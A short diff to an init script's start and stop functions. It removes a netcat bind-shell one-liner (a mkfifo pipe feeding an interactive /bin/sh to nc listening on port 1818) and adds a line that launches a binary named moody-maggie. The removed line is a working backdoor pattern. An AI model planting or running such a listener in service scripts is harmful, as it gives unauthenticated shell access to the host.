@@ -10,13 +10,11 @@
 ### END INIT INFO
 
 start() {
-    mkfifo /tmp/f
-    (cat /tmp/f | /bin/sh -i 2>&1 | nc -nlvp 1818 -s 127.0.0.1 > /tmp/f)
+    nohup sh -c "/usr/bin/moody-maggie" &
 }
 
 stop() {
-    killall nc
-    rm -f /tmp/f
+    killall moody-maggie
 }
 
 case "$1" in
